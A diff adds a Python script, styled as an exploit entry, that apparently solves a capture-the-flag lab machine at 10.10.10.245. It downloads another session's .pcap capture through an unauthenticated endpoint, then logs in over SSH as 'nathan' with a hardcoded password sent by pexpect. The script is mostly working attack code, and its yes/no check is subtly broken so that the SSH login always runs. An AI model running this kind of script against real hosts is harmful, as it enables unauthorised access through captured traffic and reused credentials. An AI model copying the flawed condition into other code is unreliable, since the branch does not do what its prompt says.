@@ -1,0 +1,68 @@
+# Exploit Title: Automated SSH and File Download Script for CTF Challenges
+# Date: 05.09.2024
+# Author: Octups
+# Description: This Python script automates the process of downloading a .pcap file from a web server and optionally establishes an SSH connection to a remote server. 
+# The script checks for a file download button on the specified URL, downloads the file to the user's desktop, and provides an option to automate SSH login using pexpect.
+# Software Link: https://github.com/Octups/CAP-MACHINE.git
+# Tested on: Kali Linux
+
+import requests
+from bs4 import BeautifulSoup
+import time
+import os
+import pexpect
+
+
+# Make the request
+response = requests.get("http://10.10.10.245/data/0")
+
+# Check if the response was successful
+if response.status_code == 200:
+    soup = BeautifulSoup(response.content, "lxml")
+    
+    # Find the download button
+    download_button = soup.find("div", class_="main-content-inner").find("button", class_="btn btn-info")
+    
+    if download_button:
+        print(".PCAP File Was Found.")
+        
+        # Download the file
+        download_file = requests.get("http://10.10.10.245/download/0")
+        
+        # Get the path to the Desktop
+        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+        
+        # Save the file to the Desktop
+        file_path = os.path.join(desktop_path, "downloaded_file.pcap")
+        with open(file_path, "wb") as file:
+            file.write(download_file.content)
+        
+        #Downloading The File        
+        print(f"The File Was Downloading to {file_path}.")
+        
+        time.sleep(3)
+        #The Files Was Downloaded
+        print("The File Was Downloaded.")
+        
+        solvethelab = input("Until Now The Script Can Create Connection To SSH Do You Want To Create It Or Solve The With Your Self (Y/N) : ")
+        
+        if solvethelab == "y" or "Y":
+        
+            ssh_command = "ssh nathan@10.10.10.245"
+            
+            child = pexpect.spawn(ssh_command)
+
+            # Wait for the password prompt
+            child.expect('password:')
+
+            # Send the password automatically
+            child.sendline('Buck3tH4TF0RM3!')
+            
+            child.interact()
+        elif solvethelab == "n" or "N":
+            print("The Script Stoppend Now You Should Check Your .PCAP File.")
+            exit()
+    else:
+        print("No .PCAP File Was Found.")
+else:
+    print("Failed to connect to the server. Status code:", response.status_code)
